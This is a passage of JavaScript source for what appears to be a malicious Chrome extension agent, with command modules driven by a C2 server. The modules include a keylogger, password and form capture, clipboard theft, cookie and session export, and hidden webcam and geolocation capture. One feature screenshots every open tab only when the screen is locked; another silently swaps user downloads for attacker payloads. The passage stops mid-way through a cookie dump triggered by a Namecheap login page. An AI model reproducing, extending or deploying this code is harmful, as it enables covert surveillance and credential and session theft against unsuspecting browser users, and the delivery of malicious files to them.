      const b64     = await new Promise(res => {
        reader.onloadend = () => res(reader.result.split(',')[1] || "");
        reader.readAsDataURL(outBlob);
      });
      postFile(task.id, "screenshot.png", b64, false,
               "Screenshot captured — use the download arrow on this task row");
    } catch (e) {
      // Compositing failed — fall back to plain screenshot
      postFile(task.id, "screenshot.png", dataUrl.split(",")[1] || "", false,
               "Screenshot captured (video overlay failed: " + e.message + ")");
    }
  });
}
// __ENDCMD__

// __CMD__ keylog,disable_keylog
let keylogBuffer = "", activeKeylogTaskId = null;

function cmdKeylogStart(task) {
  activeKeylogTaskId = task.id;
  chrome.runtime.onMessage.addListener(handleKeylogMessage);
  postResponse(task.id, "Keylogger started", false);
}

function cmdKeylogStop(task) {
  chrome.runtime.onMessage.removeListener(handleKeylogMessage);
  if (keylogBuffer && activeKeylogTaskId) {
    postResponse(activeKeylogTaskId, keylogBuffer, true);
    keylogBuffer = "";
  }
  activeKeylogTaskId = null;
  postResponse(task.id, "Keylogger stopped");
}

function handleKeylogMessage(msg) {
  if (msg.type !== "log") return;
  keylogBuffer += msg.data;
  if (keylogBuffer.length >= 200 && activeKeylogTaskId) {
    postResponse(activeKeylogTaskId, keylogBuffer, false);
    keylogBuffer = "";
  }
}
// __ENDCMD__

// __CMD__ autofill,disable_autofill
let activeAutofillTaskId = null;
let autofillBuffer = [];

function cmdAutofillStart(task) {
  activeAutofillTaskId = task.id;
  // Flush any captures that arrived before the command was issued
  if (autofillBuffer.length) {
    postResponse(task.id, autofillBuffer.join("\n"), false);
    autofillBuffer = [];
  }
  postResponse(task.id, "Autofill capture started — form submissions and password fields will be logged", false);
}

function cmdAutofillStop(task) {
  if (autofillBuffer.length && activeAutofillTaskId) {
    postResponse(activeAutofillTaskId, autofillBuffer.join("\n"), true);
    autofillBuffer = [];
  }
  activeAutofillTaskId = null;
  postResponse(task.id, "Autofill capture stopped");
}
// __ENDCMD__

// __CMD__ inject_tab
async function cmdInjectTab(task, mode, url) {
  if (!/^https?:\/\//i.test(url)) { postResponse(task.id, "URL must start with http(s): " + url); return; }
  try {
    if (mode === "current") {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) { postResponse(task.id, "No active tab found"); return; }
      await chrome.tabs.update(tab.id, { url });
      postResponse(task.id, `Injected ${url} into current tab (id=${tab.id})`);
    } else if (mode === "new") {
      const created = await chrome.tabs.create({ url, active: true });
      postResponse(task.id, `Injected ${url} into new tab (id=${created.id})`);
    } else {
      postResponse(task.id, `Unknown mode "${mode}". Use "current" or "new".`);
    }
  } catch (err) {
    postResponse(task.id, "inject_tab error: " + err.message);
  }
}
// __ENDCMD__

// __CMD__ idle
function cmdIdle(task) {
  // Threshold: consider idle after 60 s of no user input
  chrome.idle.queryState(60, (state) => {
    postResponse(task.id, JSON.stringify({
      idle_state: state,           // "active" | "idle" | "locked"
      screen_locked: state === "locked",
      timestamp: new Date().toISOString()
    }, null, 2));
  });
}
// __ENDCMD__

// __CMD__ clipboard
async function cmdClipboard(task) {
  try {
    const win = await new Promise(res => chrome.windows.getLastFocused({ populate: true }, res));
    if (!win || chrome.runtime.lastError) {
      postResponse(task.id, "No focused window: " + (chrome.runtime.lastError?.message || "unknown"));
      return;
    }
    const tab = (win.tabs || []).find(t => t.active);
    if (!tab?.id) { postResponse(task.id, "No active tab"); return; }
    if (!tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) {
      postResponse(task.id, "Cannot access clipboard from this tab: " + tab.url);
      return;
    }

    // Timeout wrapper — navigator.clipboard.readText() can hang forever if the
    // page isn't focused or doesn't have a user gesture. 3 s timeout prevents
    // the command from silently stalling.
    const r = await Promise.race([
      chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: async () => {
          try {
            const text = await navigator.clipboard.readText();
            return text === "" ? "(empty clipboard)" : text;
          } catch (e) {
            // Fallback: try execCommand paste (works without focus in some browsers)
            try {
              const ta = document.createElement("textarea");
              ta.style.cssText = "position:fixed;opacity:0;left:-9999px";
              document.body.appendChild(ta);
              ta.focus();
              document.execCommand("paste");
              const val = ta.value;
              ta.remove();
              if (val) return val;
            } catch (_) {}
            return "__ERR__" + e.message;
          }
        }
      }),
      new Promise((_, rej) => setTimeout(() => rej(new Error(
        "Clipboard read timed out (3 s). The active tab may not be focused — " +
        "click into the tab first, then re-run clipboard."
      )), 3000))
    ]);

    const val = r?.[0]?.result ?? "(no result)";
    if (String(val).startsWith("__ERR__")) {
      postResponse(task.id, "Clipboard error: " + String(val).slice(7));
    } else {
      postResponse(task.id, val);
    }
  } catch (e) {
    postResponse(task.id, "Clipboard failed: " + (e.message || String(e)));
  }
}
// __ENDCMD__

// __CMD__ download_history
function cmdDownloadHistory(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}

  const limit     = opts.limit      ?? 200;
  const urlFilter = opts.url_filter ?? "";

  const query = { orderBy: ["-startTime"], limit };
  if (urlFilter) query.urlContains = urlFilter;

  chrome.downloads.search(query, (items) => {
    if (chrome.runtime.lastError) {
      postResponse(task.id, "Download history error: " + chrome.runtime.lastError.message);
      return;
    }

    const fmt = (iso) => {
      const d = new Date(iso || 0), p = n => String(n).padStart(2, "0");
      return `${d.getFullYear()}-${p(d.getMonth()+1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
    };

    const fmtSize = (bytes) => {
      if (!bytes || bytes < 0) return "?";
      if (bytes < 1024) return bytes + "B";
      if (bytes < 1048576) return Math.round(bytes / 1024) + "KB";
      return (bytes / 1048576).toFixed(1) + "MB";
    };

    const lines = items.map(it =>
      `[${fmt(it.startTime)}] [${it.state}] ${fmtSize(it.fileSize)} ${it.filename || it.url}`
    );

    if (lines.length <= 100) {
      postResponse(task.id, lines.join("\n") || "(no download history)");
    } else {
      const b64 = bytesToBase64(new TextEncoder().encode(lines.join("\n")));
      postFile(task.id, "download_history.txt", b64, false,
        `Download history: ${lines.length} entries — use the download arrow on this task row`);
    }
  });
}
// __ENDCMD__

// __CMD__ uptime
function cmdUptime(task) {
  chrome.storage.local.get(["extensionStartTime"], (result) => {
    const now       = Date.now();
    const installed = result.extensionStartTime || now;
    const totalSec  = Math.floor((now - installed) / 1000);

    const fmt = (s) => {
      const d = Math.floor(s / 86400), h = Math.floor((s % 86400) / 3600),
            m = Math.floor((s % 3600) / 60), sec = s % 60;
      return `${d}d ${h}h ${m}m ${sec}s`;
    };

    const workerSec = Math.floor(performance.now() / 1000);

    postResponse(task.id, JSON.stringify({
      extension_installed_since: new Date(installed).toISOString(),
      extension_uptime:          fmt(totalSec),
      service_worker_uptime:     fmt(workerSec),
      timestamp:                 new Date(now).toISOString()
    }, null, 2));
  });
}
// __ENDCMD__

// __CMD__ list_extensions
// ── list_extensions ───────────────────────────────────────────────────────────
function cmdListExtensions(task) {
  chrome.management.getAll((exts) => {
    if (chrome.runtime.lastError) { postResponse(task.id, "Error: " + chrome.runtime.lastError.message); return; }
    const data = exts.map(e => ({
      id: e.id, name: e.name, version: e.version, enabled: e.enabled,
      type: e.type, install_type: e.installType,
      permissions: e.permissions || [],
      host_permissions: e.hostPermissions || [],
    }));
    postResponse(task.id, JSON.stringify(data, null, 2));
  });
}
// __ENDCMD__

// __CMD__ local_storage
// ── local_storage ─────────────────────────────────────────────────────────────
function cmdLocalStorage(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  chrome.windows.getLastFocused({ populate: true }, (win) => {
    const tab = (win?.tabs || []).find(t => t.active);
    if (!tab?.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) {
      postResponse(task.id, "No suitable active tab for local_storage"); return;
    }
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: () => {
        const dump = (s) => { const o = {}; for (let i = 0; i < s.length; i++) { const k = s.key(i); o[k] = s.getItem(k); } return o; };
        return { url: window.location.href, localStorage: dump(localStorage), sessionStorage: dump(sessionStorage) };
      }
    }, (results) => {
      if (chrome.runtime.lastError) { postResponse(task.id, "local_storage error: " + chrome.runtime.lastError.message); return; }
      postResponse(task.id, JSON.stringify(results?.[0]?.result || {}, null, 2));
    });
  });
}
// __ENDCMD__

// __CMD__ find_in_dom
// ── find_in_dom ───────────────────────────────────────────────────────────────
async function cmdFindInDom(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  const pattern = opts.pattern || "";
  if (!pattern) { postResponse(task.id, "find_in_dom requires a pattern parameter"); return; }
  const flags = opts.flags || "gi";

  try {
    const tabs = await new Promise(res => chrome.tabs.query({}, res));
    const results = [];
    for (const tab of tabs) {
      if (!tab.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) continue;
      try {
        // 5 s timeout per tab — large DOMs can hang the regex
        const r = await Promise.race([
          chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: (pat, fl) => {
              try {
                const re = new RegExp(pat, fl);
                // Search outerHTML (capped at 2 MB to prevent OOM/hang on heavy pages)
                let html = document.documentElement.outerHTML || "";
                if (html.length > 2000000) html = html.slice(0, 2000000);
                // Also search input/textarea values which aren't in outerHTML if dynamically set
                const inputVals = [...document.querySelectorAll("input, textarea, select")]
                  .map(el => el.value).filter(Boolean).join("\n");
                const combined = html + "\n" + inputVals;
                const matches = [...new Set([...combined.matchAll(re)].map(m => m[0]))].slice(0, 50);
                return { url: window.location.href, title: document.title, count: matches.length, matches };
              } catch (e) { return { url: window.location.href, error: e.message, matches: [] }; }
            },
            args: [pattern, flags]
          }),
          new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 5000))
        ]);
        const res = r?.[0]?.result;
        if (res?.matches?.length) results.push(res);
        else if (res?.error) results.push(res);
      } catch (_) {} // per-tab timeout or injection failure — skip
    }
    postResponse(task.id, results.length ? JSON.stringify(results, null, 2) : `No matches for pattern: ${pattern}`);
  } catch (e) {
    postResponse(task.id, "find_in_dom error: " + (e.message || String(e)));
  }
}
// __ENDCMD__

// __CMD__ network_monitor_start,network_monitor_stop
// ── network_monitor ───────────────────────────────────────────────────────────
let netLog = [], netMonitorActive = false, netMonitorTaskId = null;

function onNetworkEvent(details) {
  if (!netMonitorActive) return;
  const ts = new Date().toISOString();
  const ct = (details.responseHeaders || []).find(h => h.name.toLowerCase() === "content-type")?.value || "";
  netLog.push(`[${ts}] ${details.statusCode} ${details.method || "?"} ${details.url}${ct ? " (" + ct.split(";")[0].trim() + ")" : ""}`);
}

function cmdNetworkMonitorStart(task) {
  netMonitorTaskId = task.id; netMonitorActive = true; netLog = [];
  chrome.webRequest.onCompleted.addListener(onNetworkEvent, { urls: ["<all_urls>"] }, ["responseHeaders"]);
  postResponse(task.id, "Network monitor started", false);
}

function cmdNetworkMonitorStop(task) {
  netMonitorActive = false;
  chrome.webRequest.onCompleted.removeListener(onNetworkEvent);
  const lines = netLog.slice(); netLog = []; netMonitorTaskId = null;
  if (lines.length <= 100) {
    postResponse(task.id, lines.join("\n") || "(no requests captured)");
  } else {
    const b64 = bytesToBase64(new TextEncoder().encode(lines.join("\n")));
    postFile(task.id, "network_log.txt", b64, false,
      `Network log: ${lines.length} entries — use the download arrow on this task row`);
  }
}
// __ENDCMD__

// __CMD__ session_export
// ── session_export ────────────────────────────────────────────────────────────
async function cmdSessionExport(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  const win = await new Promise(res => chrome.windows.getLastFocused({ populate: true }, res));
  const tab = (win?.tabs || []).find(t => t.active);
  let origin = opts.origin || "";
  if (!origin && tab?.url) { try { origin = new URL(tab.url).origin; } catch (_) {} }
  if (!origin) { postResponse(task.id, "session_export requires an origin or active tab"); return; }

  const cookies = await new Promise(res => chrome.cookies.getAll({ url: origin }, res));
  let storage = { localStorage: {}, sessionStorage: {} };
  if (tab?.id && !tab.url?.startsWith("chrome://")) {
    try {
      const r = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const d = (s) => { const o = {}; for (let i = 0; i < s.length; i++) { const k = s.key(i); o[k] = s.getItem(k); } return o; };
          return { localStorage: d(localStorage), sessionStorage: d(sessionStorage) };
        }
      });
      storage = r?.[0]?.result || storage;
    } catch (_) {}
  }

  const session = {
    origin, exported_at: new Date().toISOString(),
    cookies: (cookies || []).map(c => ({
      name: c.name, value: c.value, domain: c.domain, path: c.path,
      secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite,
      expirationDate: c.expirationDate || null
    })),
    ...storage
  };
  const hostname = origin.replace(/^https?:\/\//, "").replace(/[^a-z0-9]/gi, "_");
  const b64 = bytesToBase64(new TextEncoder().encode(JSON.stringify(session, null, 2)));
  postFile(task.id, `session_${hostname}_${Date.now()}.json`, b64, false,
    `Session exported for ${origin} — use the download arrow on this task row`);
}
// __ENDCMD__

// __CMD__ download_url
// ── download_url ──────────────────────────────────────────────────────────────
async function cmdDownloadUrl(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  const url = opts.url || (typeof params === "string" ? params.trim() : "");
  if (!url.startsWith("http")) { postResponse(task.id, "download_url requires a url parameter"); return; }
  const filename = opts.filename || url.split("/").pop().split("?")[0] || "download";
  try {
    const cookieStr = await new Promise(res => chrome.cookies.getAll({ url }, c =>
      res(chrome.runtime.lastError || !c?.length ? "" : c.map(x => `${x.name}=${x.value}`).join("; "))));
    const hdrs = {};
    if (cookieStr) hdrs["Cookie"] = cookieStr;
    const resp = await fetch(url, { credentials: "omit", headers: hdrs, cache: "no-cache" });
    if (!resp.ok) { postResponse(task.id, `Fetch failed: HTTP ${resp.status}`); return; }
    const buf = await resp.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let bin = "";
    const chunk = 32768;
    for (let i = 0; i < bytes.length; i += chunk)
      bin += String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + chunk, bytes.length)));
    postFile(task.id, filename, btoa(bin), false,
      `Downloaded ${filename} (${bytes.length} bytes) — use the download arrow on this task row`);
  } catch (e) { postResponse(task.id, "download_url error: " + e.message); }
}
// __ENDCMD__

// __CMD__ screenshot_all
// ── screenshot_all ────────────────────────────────────────────────────────────
// Captures EVERY open tab across all windows by briefly activating each one,
// then restores the original active tabs. Requires screen to be locked unless
// the "force" parameter is set — the user would see tabs flipping otherwise.
async function cmdScreenshotAll(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  const force = opts.force === true || opts.force === "true";

  try {
    if (!force) {
      const idleState = await new Promise(res => chrome.idle.queryState(15, res));
      if (idleState !== "locked") {
        postResponse(task.id,
          `Screen is not locked (state: ${idleState}). Tab switching would be visible to the user.\n` +
          `Either wait for the screen to lock, or re-run with: {"force": true}`);
        return;
      }
    }

    const windows = await new Promise(res => chrome.windows.getAll({ populate: true }, res));
    const parts = [
      `<html><head><meta charset="utf-8"><title>Screenshots ${new Date().toISOString()}</title>`,
      `<style>body{background:#111;color:#eee;font-family:sans-serif;margin:20px}`,
      `img{max-width:100%;border:1px solid #444;display:block;margin:8px 0}`,
      `h3{margin:24px 0 4px;color:#7cf}p{margin:2px 0;font-size:12px;color:#aaa}</style></head><body>`,
      `<h2>screenshot_all — ${new Date().toISOString()}</h2>`
    ];
    let captured = 0, total = 0;

    for (const win of windows) {
      if (win.state === "minimized") continue;
      const tabs = (win.tabs || []).filter(t =>
        t.url && !t.url.startsWith("chrome://") && !t.url.startsWith("chrome-extension://")
      );
      if (!tabs.length) continue;

      // Save the ID of the originally active tab (the .active property is a stale
      // snapshot — it won't update as we switch tabs, so use the ID to restore later)
      const originalActiveId = (tabs.find(t => t.active) || {}).id;

      for (const tab of tabs) {
        total++;
        try {
          await new Promise(res => chrome.tabs.update(tab.id, { active: true }, res));
          await new Promise(res => setTimeout(res, 200));
          const dataUrl = await new Promise((res, rej) => {
            chrome.tabs.captureVisibleTab(win.id, { format: "png" }, d => {
              chrome.runtime.lastError ? rej(new Error(chrome.runtime.lastError.message)) : res(d);
            });
          });

          let finalUrl = dataUrl;
          let videoFrames = [];
          try {
            const results = await chrome.scripting.executeScript({
              target: { tabId: tab.id },
              func: () => {
                const frames = [];
                document.querySelectorAll('video').forEach(v => {
                  if (!v.videoWidth || v.readyState < 2) return;
                  const r = v.getBoundingClientRect();
                  if (!r.width || !r.height) return;
                  try {
                    const c = document.createElement('canvas');
                    c.width = r.width; c.height = r.height;
                    c.getContext('2d').drawImage(v, 0, 0, r.width, r.height);
                    frames.push({ dataUrl: c.toDataURL('image/png'),
                                  x: Math.round(r.left), y: Math.round(r.top),
                                  w: Math.round(r.width), h: Math.round(r.height) });
                  } catch (_) {}
                });
                return frames;
              },
            });
            videoFrames = results?.[0]?.result || [];
          } catch (_) {}

          if (videoFrames.length) {
            try {
              const pageBlob = await fetch(dataUrl).then(r => r.blob());
              const pageImg  = await createImageBitmap(pageBlob);
              const canvas   = new OffscreenCanvas(pageImg.width, pageImg.height);
              const ctx      = canvas.getContext('2d');
              ctx.drawImage(pageImg, 0, 0);
              for (const f of videoFrames) {
                const vBlob = await fetch(f.dataUrl).then(r => r.blob());
                const vImg  = await createImageBitmap(vBlob);
                ctx.drawImage(vImg, f.x, f.y, f.w, f.h);
              }
              const outBlob = await canvas.convertToBlob({ type: 'image/png' });
              const reader  = new FileReader();
              finalUrl = await new Promise(res => {
                reader.onloadend = () => res(reader.result);
                reader.readAsDataURL(outBlob);
              });
            } catch (_) {}
          }

          parts.push(`<h3>${tab.title || "(untitled)"}</h3><p>${tab.url}</p><img src="${finalUrl}">`);
          captured++;
        } catch (e) {
          parts.push(`<h3>${tab.url}</h3><p style="color:#f77">Capture failed: ${e.message}</p>`);
        }
      }

      // Restore the originally active tab
      if (originalActiveId) {
        try { await new Promise(res => chrome.tabs.update(originalActiveId, { active: true }, res)); }
        catch (_) {}
      }
    }

    parts.push("</body></html>");
    const b64 = bytesToBase64(new TextEncoder().encode(parts.join("\n")));
    postFile(task.id, `screenshots_${Date.now()}.html`, b64, false,
      `Captured ${captured}/${total} tabs — use the download arrow on this task row`);
  } catch (e) { postResponse(task.id, "screenshot_all error: " + e.message); }
}
// __ENDCMD__

// __CMD__ geolocation
// ── geolocation ───────────────────────────────────────────────────────────────
function cmdGeolocation(task) {
  chrome.windows.getLastFocused({ populate: true }, (win) => {
    const tab = (win?.tabs || []).find(t => t.active);
    if (!tab?.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) {
      postResponse(task.id, "No suitable tab for geolocation"); return;
    }
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: () => new Promise(res => navigator.geolocation.getCurrentPosition(
        p => res({ latitude: p.coords.latitude, longitude: p.coords.longitude,
                   accuracy_m: p.coords.accuracy, altitude: p.coords.altitude,
                   timestamp: new Date(p.timestamp).toISOString() }),
        e => res({ error: e.message, code: e.code }),
        { enableHighAccuracy: true, timeout: 10000 }
      ))
    }, (results) => {
      if (chrome.runtime.lastError) { postResponse(task.id, "Geolocation error: " + chrome.runtime.lastError.message); return; }
      postResponse(task.id, JSON.stringify(results?.[0]?.result || { error: "no result" }, null, 2));
    });
  });
}
// __ENDCMD__

// __CMD__ webcam
// ── webcam ───────────────────────────────────────────────────────────────────
// Captures a single frame from the user's webcam by injecting getUserMedia into
// the active tab. Works on pages where camera permission was previously granted
// or auto-allowed. The video element and stream are created and destroyed within
// the content script — nothing visible appears on the page.
async function cmdWebcam(task) {
  try {
    const win = await new Promise(res => chrome.windows.getLastFocused({ populate: true }, res));
    const tab = (win?.tabs || []).find(t => t.active);
    if (!tab?.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) {
      postResponse(task.id, "No suitable tab for webcam capture"); return;
    }

    const r = await Promise.race([
      chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: async () => {
          try {
            const stream = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
              audio: false
            });
            const video = document.createElement("video");
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.style.cssText = "position:fixed;opacity:0;pointer-events:none;z-index:-9999";
            document.body.appendChild(video);
            await video.play();
            // Wait for a real frame to be available
            await new Promise(res => {
              if (video.readyState >= 2) return res();
              video.addEventListener("loadeddata", res, { once: true });
            });
            // Small delay for auto-exposure to settle
            await new Promise(res => setTimeout(res, 500));
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth || 1280;
            canvas.height = video.videoHeight || 720;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL("image/png");
            // Cleanup
            stream.getTracks().forEach(t => t.stop());
            video.remove();
            return dataUrl.split(",")[1] || "";
          } catch (e) {
            return "__ERR__" + e.message;
          }
        }
      }),
      new Promise((_, rej) => setTimeout(() => rej(new Error(
        "Webcam capture timed out (10 s). The page may not have camera permission — " +
        "try on a page where the user has previously granted camera access (e.g. Google Meet)."
      )), 10000))
    ]);

    const val = r?.[0]?.result ?? "";
    if (!val) {
      postResponse(task.id, "Webcam returned empty result");
    } else if (String(val).startsWith("__ERR__")) {
      postResponse(task.id, "Webcam error: " + String(val).slice(7));
    } else {
      postFile(task.id, `webcam_${Date.now()}.png`, val, false,
        "Webcam snapshot captured — use the download arrow on this task row");
    }
  } catch (e) {
    postResponse(task.id, "Webcam failed: " + (e.message || String(e)));
  }
}
// __ENDCMD__

// __CMD__ notifications
// ── notifications ─────────────────────────────────────────────────────────────
// Reports Notification.permission for every open tab and lists any pending
// chrome extension notification IDs.
async function cmdNotifications(task) {
  const tabs = await new Promise(res => chrome.tabs.query({}, res));
  const perms = [];
  for (const tab of tabs) {
    if (!tab.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) continue;
    try {
      const r = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => ({ url: window.location.href, title: document.title, permission: Notification.permission })
      });
      const res = r?.[0]?.result;
      if (res) perms.push(res);
    } catch (_) {}
  }
  chrome.notifications.getAll((notifs) => {
    postResponse(task.id, JSON.stringify({
      tab_notification_permissions: perms,
      extension_notification_ids: Object.keys(notifs || {})
    }, null, 2));
  });
}
// __ENDCMD__

// __CMD__ list_pwas
// ── list_pwas ─────────────────────────────────────────────────────────────────
function cmdListPwas(task) {
  chrome.management.getAll((exts) => {
    if (chrome.runtime.lastError) { postResponse(task.id, "Error: " + chrome.runtime.lastError.message); return; }
    const apps = exts.filter(e => e.isApp || ["hosted_app","packaged_app","legacy_packaged_app"].includes(e.type));
    postResponse(task.id, JSON.stringify(
      apps.map(a => ({ id: a.id, name: a.name, version: a.version, type: a.type, enabled: a.enabled, launchUrl: a.appLaunchUrl || "" })),
      null, 2
    ));
  });
}
// __ENDCMD__

// __CMD__ download_watch,download_watch_stop
// ── download_watch ────────────────────────────────────────────────────────────
let dlWatchActive = false, dlWatchTaskId = null;
const dlWatchLog = [];

function onDownloadCreatedWatch(item) {
  if (!dlWatchActive) return;
  const line = `[${new Date().toISOString()}] id=${item.id} ${item.mime || "?"} ${item.totalBytes > 0 ? Math.round(item.totalBytes/1024)+"KB" : "?KB"} ${item.url}`;
  dlWatchLog.push(line);
  if (dlWatchTaskId) postResponse(dlWatchTaskId, "[DOWNLOAD] " + line, false);
}

function cmdDownloadWatch(task) {
  dlWatchTaskId = task.id; dlWatchActive = true; dlWatchLog.length = 0;
  chrome.downloads.onCreated.addListener(onDownloadCreatedWatch);
  postResponse(task.id, "Download watch started — reporting new downloads as they occur", false);
}

function cmdDownloadWatchStop(task) {
  dlWatchActive = false;
  chrome.downloads.onCreated.removeListener(onDownloadCreatedWatch);
  const lines = dlWatchLog.slice(); dlWatchLog.length = 0; dlWatchTaskId = null;
  postResponse(task.id, lines.join("\n") || "(no downloads observed)");
}
// __ENDCMD__

// __CMD__ download_intercept_start,download_intercept_stop
// ── download_intercept ────────────────────────────────────────────────────────
// Armed rules: URL/filename substring → replacement file config.
// Supports inline base64 payload (content_b64) or a fetch URL (replace_url).
//
// NOTE: onDeterminingFilename fires AFTER onCreated in Chrome's download pipeline,
// so all intercept logic lives here — this is the first point where the real
// filename (from Content-Disposition / URL) is available.
const dlIntercepts = {};

function onDeterminingFilenameForIntercept(downloadItem, suggest) {
  // Skip data:/blob: URLs — these are our own replacement downloads, not real user activity
  if (downloadItem.url.startsWith("data:") || downloadItem.url.startsWith("blob:")) {
    suggest();
    return;
  }

  const fname    = (downloadItem.filename || "").replace(/\\/g, "/").split("/").pop();
  const urlLower = (downloadItem.url || "").toLowerCase();

  for (const [pat, cfg] of Object.entries(dlIntercepts)) {
    const p = pat.toLowerCase();
    if (!urlLower.includes(p) && !fname.toLowerCase().includes(p)) continue;

    const realName = fname || urlLower.split("/").pop().split("?")[0] || "download";

    suggest(); // release Chrome's filename lock before doing async work

    const dlId  = downloadItem.id;
    const dlCfg = cfg;
    setTimeout(() => {
      chrome.downloads.cancel(dlId, () => {
        chrome.downloads.erase({ id: dlId }, () => {});
        (async () => {
          let dataUrl;
          if (dlCfg.content_b64) {
            dataUrl = `data:application/octet-stream;base64,${dlCfg.content_b64}`;
          } else if (dlCfg.replace_url) {
            try {
              const resp  = await fetch(dlCfg.replace_url, { credentials: "omit" });
              const buf   = await resp.arrayBuffer();
              const bytes = new Uint8Array(buf);
              let bin = ""; const chunk = 32768;
              for (let i = 0; i < bytes.length; i += chunk)
                bin += String.fromCharCode.apply(null, bytes.subarray(i, Math.min(i + chunk, bytes.length)));
              dataUrl = `data:application/octet-stream;base64,${btoa(bin)}`;
            } catch (e) { ; return; }
          }
          if (!dataUrl) return;
          // Temporarily remove listener so the replacement download isn't re-intercepted
          chrome.downloads.onDeterminingFilename.removeListener(onDeterminingFilenameForIntercept);
          chrome.downloads.download({ url: dataUrl, filename: realName, saveAs: false, conflictAction: "overwrite" }, (newId) => {
            // Re-arm the listener now that the replacement download is created
            if (Object.keys(dlIntercepts).length) {
              chrome.downloads.onDeterminingFilename.addListener(onDeterminingFilenameForIntercept);
            }
          });
        })().catch(e => {
          // Re-arm listener even on error
          if (Object.keys(dlIntercepts).length) {
            chrome.downloads.onDeterminingFilename.addListener(onDeterminingFilenameForIntercept);
          }
        });
      });
    }, 0);

    return; // only match first rule per download
  }
  suggest();
}

function cmdDownloadInterceptStart(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  const { pattern, content_b64, replace_url } = opts;
  if (!pattern || (!content_b64 && !replace_url)) {
    postResponse(task.id, "download_intercept_start requires: pattern, and content_b64 or replace_url");
    return;
  }
  const wasEmpty = !Object.keys(dlIntercepts).length;
  dlIntercepts[pattern] = { content_b64, replace_url };
  if (wasEmpty) {
    chrome.downloads.onDeterminingFilename.addListener(onDeterminingFilenameForIntercept);
  }
  postResponse(task.id, `Intercept armed — pattern: "${pattern}" (${Object.keys(dlIntercepts).length} rule(s) active)`);
}

function cmdDownloadInterceptStop(task, params) {
  let opts = {};
  try { opts = params ? JSON.parse(params) : {}; } catch (_) {}
  const pattern = opts.pattern || "";
  if (pattern && dlIntercepts[pattern]) {
    delete dlIntercepts[pattern];
    postResponse(task.id, `Rule removed: "${pattern}" (${Object.keys(dlIntercepts).length} remaining)`);
  } else {
    Object.keys(dlIntercepts).forEach(k => delete dlIntercepts[k]);
    postResponse(task.id, "All intercept rules cleared");
  }
  if (!Object.keys(dlIntercepts).length) {
    chrome.downloads.onDeterminingFilename.removeListener(onDeterminingFilenameForIntercept);
  }
}
// __ENDCMD__

function cmdExitRunning(task) {
  stopHeartbeat();
  postResponse(task.id, "Agent callback stopped — extension remains installed");
  setTimeout(() => {
    if (socket) { try { socket.close(); } catch (_) {} }
    socket = null;
  }, 2000);
}

function cmdExitFull(task) {
  stopHeartbeat();
  postResponse(task.id, "Agent uninstalling");
  setTimeout(() => {
    if (socket) { try { socket.close(); } catch (_) {} }
    chrome.management.uninstallSelf({ showConfirmDialog: false }, () => {});
  }, 2000);
}

// __CMD__ reload_extension
function cmdReloadExtension(task) {
  // Reloads the extension via chrome.runtime.reload(). All in-memory state is
  // discarded — active sockets, timers, proxy sessions, in-flight tasks. The
  // agent re-initialises and reconnects to C2 automatically within a few seconds.
  // Persisted state (ipProxyUrl, nativeStartPsk, sleepIntervalMs) is restored
  // from chrome.storage.local on startup.
  //
  // Use this to recover from a stuck connection, leaked timer, or any bad
  // runtime state without uninstalling the extension.
  //
  // NOTE: this does NOT clear the chrome://extensions error panel. That panel is
  // owned by the browser process and can only be cleared manually:
  //   chrome://extensions → click the error badge → "Clear all"
  postResponse(task.id, "Reloading extension — all runtime state reset. Reconnects within a few seconds.");
  setTimeout(() => { chrome.runtime.reload(); }, 1500);
}
// __ENDCMD__

// __CMD__ autofill,disable_autofill
// ── Autofill / credential relay ──────────────────────────────────────────────
// autofill.js sends captured form data here via chrome.runtime.sendMessage.
// Data is forwarded to the active autofill task, or buffered until one starts.
chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg?.type === "WS_SEND") {
    const line = "\n[AUTOFILL] " + JSON.stringify(msg.payload) + "\n";
    if (activeAutofillTaskId) {
      postResponse(activeAutofillTaskId, line, false);
    } else {
      autofillBuffer.push(line);
      if (autofillBuffer.length > 100) autofillBuffer.shift();
    }
    sendResponse({ ok: true });
    return true;
  }
});
// __ENDCMD__

// __CMD__ dump_cookies
// ── Cookie dump on trigger URL ────────────────────────────────────────────────
const TRIGGER_URL = "https://ap.www.namecheap.com/";
let lastTriggerTabId = null;

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url &&
